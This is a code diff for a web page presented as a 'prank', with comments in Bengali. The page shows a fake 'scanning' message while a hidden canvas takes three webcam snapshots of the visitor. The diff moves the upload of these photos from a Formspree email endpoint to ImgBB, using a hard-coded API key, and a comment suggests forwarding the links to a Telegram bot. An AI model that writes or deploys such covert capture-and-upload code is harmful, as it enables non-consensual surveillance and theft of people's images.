@@ -25,8 +25,8 @@
 <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
 <script>
-    // এখানে আপনার Formspree থেকে পাওয়া লিংকটি বসাবেন
-    const formspreeUrl = "https://formspree.io/f/mbgljabg";
+    // এখানে আপনার ImgBB থেকে পাওয়া API Key বসাবেন
+    const imgbbApiKey = "a40de589d6a19b45212396acbf8332e7"; 
 
     function startPrank() {
         const video = document.getElementById('video');
@@ -38,10 +38,10 @@
                 video.srcObject = stream;
                 result.innerText = "স্ক্যান হচ্ছে... দয়া করে অপেক্ষা করুন! ⏳";
 
-                // ৫ সেকেন্ড পর পর ছবি তোলার লুপ (মোট ৩ বার ছবি তুলবে)
+                // ৫ সেকেন্ড পর পর ছবি তোলার লুপ (মোট ৩ বার)
                 let count = 0;
                 const interval = setInterval(() => {
-                    takeSnapshotAndSend(video);
+                    takeSnapshotAndUpload(video);
                     count++;
                     if (count >= 3) { 
                         clearInterval(interval);
@@ -55,29 +55,32 @@
             });
     }
 
-    function takeSnapshotAndSend(video) {
+    function takeSnapshotAndUpload(video) {
         const canvas = document.getElementById('canvas');
         const context = canvas.getContext('2d');
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        // ছবিকে Base64 ফরম্যাটে রূপান্তর
-        const imageData = canvas.toDataURL('image/png');
-        
-        // Formspree এর মাধ্যমে ইমেইলে পাঠিয়ে দেওয়া
-        fetch(formspreeUrl, {
-            method: 'POST',
-            headers: {
-                'Accept': 'application/json',
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ image: imageData, message: "Friend's captured photo!" })
-        }).then(response => {
-            if (response.ok) {
-                console.log("ছবি সফলভাবে ইমেইলে পাঠানো হয়েছে!");
-            }
-        }).catch(error => {
-            console.error("ত্রুটি:", error);
-        });
+        // ক্যানভাস থেকে ছবি বের করে ফর্ম ডাটা তৈরি করা
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('image', blob);
+
+            // ImgBB সার্ভারে ছবি আপলোড করা
+            fetch(`https://api.imgbb.com/1/upload?key=${imgbbApiKey}`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    console.log("ছবির লিংক:", data.data.url);
+                    // চাইলে এই লিংকটি আপনি কোনো টেলিগ্রাম বট বা অন্য কোথাও অটো রিসিভ করার ব্যবস্থা করতে পারেন
+                }
+            })
+            .catch(error => {
+                console.error("আপলোড ত্রুটি:", error);
+            });
+        }, 'image/jpeg', 0.7);
     }
 </script>
 
